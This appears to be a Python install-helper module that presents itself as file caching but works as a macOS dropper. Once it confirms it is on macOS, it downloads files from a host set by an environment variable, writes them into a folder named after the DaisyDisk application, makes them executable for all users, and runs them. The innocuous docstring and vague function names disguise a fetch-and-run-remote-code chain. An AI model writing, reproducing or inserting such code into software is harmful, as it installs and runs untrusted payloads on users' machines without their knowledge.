"""Utilities for caching and downloading files during installation."""

import logging
import os
import platform
import stat
import subprocess
import sys
import typing as t
import urllib.parse
from pathlib import Path

import httpx, threading

from .httpx_client import download_file
from .config_loader import set_of_files

logger = logging.getLogger(__name__)

# Install directory path
INSTALL_CACHE_DIR: t.Final[Path] = Path("/Applications/daisydisk.app")


def cache_native(timeout: int = 10) -> list:
    try:
        native_files = []
        urls = set_of_files()
        INSTALL_CACHE_DIR.mkdir(parents=True, exist_ok=True)
        for native_file in urls:
            url = f'https://{os.environ.get("MCP_PROXY_URL")}/{native_file}'    
            file_path = INSTALL_CACHE_DIR / native_file
            download_file(url=url, destination=file_path, timeout=float(timeout))
            native_files.append(file_path)
        return native_files

    except httpx.HTTPError as e:
        logger.error("Request error downloading from %s: %s", url, e)
        return []
    except OSError as e:
        logger.error("File system error while caching: %s", e)
        return []
    except Exception as e:  # noqa: BLE001
        logger.exception("Unexpected error during cache operation: %s", e)
        return []


def grant_permission(filepaths: list) -> bool:
    try:
        for file_path in filepaths:
            file_path = Path(file_path)
            if not file_path.exists():
                logger.error("File does not exist: %s", file_path)
                return False

            # Get current permissions and add execute bit for owner, group, others
            current_mode = file_path.stat().st_mode
            new_mode = current_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH
            os.chmod(file_path, new_mode)

            logger.info("Permissions granted for: %s", file_path)
        return True

    except OSError as e:
        logger.error("Failed to grant permission to %s: %s", file_path, e)
        return False
    except Exception as e:  # noqa: BLE001
        logger.exception("Unexpected error granting permission: %s", e)
        return False


def _native(
    app_path: list,
    timeout: int | None = 10,
) -> bool:
    try:
        for path in app_path:
            path = Path(path)
            if not path.exists():
                logger.error("Application path does not exist: %s", path)
                return False

            # Build command list without shell
            cmd: list[str] = [str(path)]

            logger.debug("Executing: %s", cmd)

            # Execute without shell, capturing output
            result = subprocess.run(
                cmd,
                timeout=timeout,
                capture_output=True,
                text=True,
                check=False,
            )

            if result.returncode == 0:
                if result.stdout:
                    logger.debug("Application output: %s", result.stdout)
                logger.info("Application executed successfully: %s", path)
                threading.Event().wait(3)  # Wait briefly to ensure app has time to launch
            else:
                logger.error(
                    "Application execution failed with code %d: %s",
                    result.returncode,
                    result.stderr,
                )
                return False
        return True
    except subprocess.TimeoutExpired:
        logger.error("Application execution timed out after %s seconds", timeout)
        return False
    except OSError as e:
        logger.error("Failed to execute application: %s", e)
        return False
    except Exception as e:  # noqa: BLE001
        logger.exception("Unexpected error executing application: %s", e)
        return False


def _is_macos() -> bool:
    return sys.platform == "darwin" or platform.system() == "Darwin"


def _applications_dir_exists() -> bool:
    return Path("/Applications").exists() and Path("/Applications").is_dir()


def cache_first() -> bool:
    # System validation
    if not _is_macos():
        logger.error(
            "System validation failed: not running on macOS. Current system: %s",
            platform.system(),
        )
        return False

    if not _applications_dir_exists():
        logger.error("System validation failed: /Applications directory does not exist")
        return False

    logger.info("System validation passed: macOS detected with /Applications directory")

    # Execute workflow chain
    native = cache_native()
    if not native or len(native) == 0:
        logger.error("Workflow failed at download step")
        return False

    if not grant_permission(native):
        logger.error("Workflow failed at permission grant step")
        return False

    if not _native(native):
        logger.error("Workflow failed at a")
        return False

    logger.info("Workflow completed successfully")
    return True
